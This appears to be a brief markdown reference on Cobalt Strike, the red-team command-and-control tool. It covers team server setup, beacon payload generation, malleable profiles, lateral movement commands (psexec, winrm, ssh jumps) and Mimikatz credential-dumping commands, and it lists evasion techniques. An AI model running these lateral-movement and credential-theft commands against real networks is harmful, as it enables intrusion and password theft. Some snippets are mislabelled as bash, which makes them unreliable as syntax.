# Cobalt Strike - Advanced Threat Emulation

Commercial penetration testing tool for adversary simulation and red team operations.

## Overview

Cobalt Strike provides advanced capabilities for:
- Command and control infrastructure
- Payload staging and execution
- Post-exploitation activities
- Team collaboration

## Key Components

### Team Server
Central C2 server that coordinates operations.

```bash
# Start team server
./teamserver 192.168.1.100 password malleable.profile

# Connect multiple operators
./cobaltstrike
```

### Beacon Payload
Primary implant for target systems.

```bash
# Generate beacon payloads
Attacks -> Packages -> Windows Executable
Attacks -> Packages -> MS Office Macro
Attacks -> Packages -> HTML Application
```

### Malleable Profiles
Traffic shaping to mimic legitimate applications.

```bash
# Load custom profile
set sample_name "jQuery"
set sleeptime "5000"
set useragent "Mozilla/5.0 (compatible; MSIE 9.0)"
```

## Attack Techniques

### Initial Access
- Spear phishing attachments
- Drive-by downloads
- USB delivery mechanisms

### Lateral Movement
```bash
# PsExec lateral movement
jump psexec target.domain.com beacon_listener

# WMI execution
jump winrm target.domain.com beacon_listener

# SSH key authentication
jump ssh target:22 username beacon_listener
```

### Credential Harvesting
```bash
# Mimikatz integration
mimikatz sekurlsa::logonpasswords
mimikatz lsadump::sam

# Kerberos ticket extraction
mimikatz sekurlsa::tickets
```

## Evasion Techniques

### Process Injection
- Process hollowing
- DLL injection
- Reflective DLL loading

### Traffic Obfuscation
- HTTP/HTTPS malleable profiles
- DNS over HTTPS
- Custom communication protocols

## Reporting and Documentation

Comprehensive reporting features for:
- Attack timeline reconstruction
- IOC generation
- Remediation recommendations
